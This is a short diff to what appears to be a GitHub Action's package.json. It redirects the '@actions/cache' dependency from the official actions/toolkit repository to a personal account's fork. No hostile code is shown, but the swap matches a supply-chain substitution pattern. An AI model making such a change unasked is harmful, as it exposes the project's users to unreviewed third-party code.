@@ -23,7 +23,7 @@
   "author": "GitHub",
   "license": "MIT",
   "dependencies": {
-    "@actions/cache": "https://github.com/actions/toolkit/tree/main/packages/cache/src",
+    "@actions/cache": "https://github.com/Reichenbach221/toolkit/tree/main/packages/cache/src",
     "@actions/core": "^1.10.0",
     "@actions/exec": "^1.1.1",
     "@actions/io": "^1.1.2"
